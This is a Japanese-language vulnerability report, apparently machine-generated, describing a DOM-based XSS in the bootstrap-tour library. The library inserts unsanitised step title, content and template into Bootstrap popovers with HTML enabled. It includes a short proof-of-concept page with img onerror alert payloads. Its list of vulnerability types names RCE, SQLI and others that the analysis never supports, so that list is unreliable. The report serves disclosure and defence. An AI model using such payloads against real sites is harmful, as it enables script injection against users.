# PAR Security Analysis Report

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `XSS`
- `AFO`
- `IDOR`
- `LFI`
- `RCE`
- `SSRF`
- `SQLI`

## PAR Policy Analysis

## 詳細解析

このライブラリでは、ユーザーが指定した"step.template"や"step.title"、"step.content"をサニタイズせずにそのままHTMLとして挿入し、$(element).popover({ html: true, content: step.content, template: step.template, title: step.title })で表示しています。つまり、悪意あるスクリプトを含む入力を渡すと、DOM上にそのままスクリプトが埋め込まれ、実行される可能性があります。これは典型的なDOMベースのXSSです。

## PoC（概念実証コード）

```text
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="bootstrap-tour.js"></script>
<script>
  // 攻撃的なツアー定義
  var tour = new Tour({
    steps: [
      {
        element: "body",
        placement: "bottom",
        title: "<img src=x onerror=alert('XSS')>",
        content: "悪意ある<img src=x onerror=alert('XSS-Content')>",
        template: "<div class='popover'><div class='arrow'></div><h3 class='popover-title'></h3><div class='popover-content'></div></div>"
      }
    ]
  });
  tour.init();
  tour.start();
</script>
```

## 解析ノート

- step.template, step.title, step.contentをサニタイズなしで$(...).popoverに渡している
- popover({ html:true })でHTMLとしてレンダリングされる
- 悪意あるonerrorスクリプトを含むと実行される
- ライブラリ側でエンコーディングやホワイトリスト処理がない
- DOMベースXSSに該当

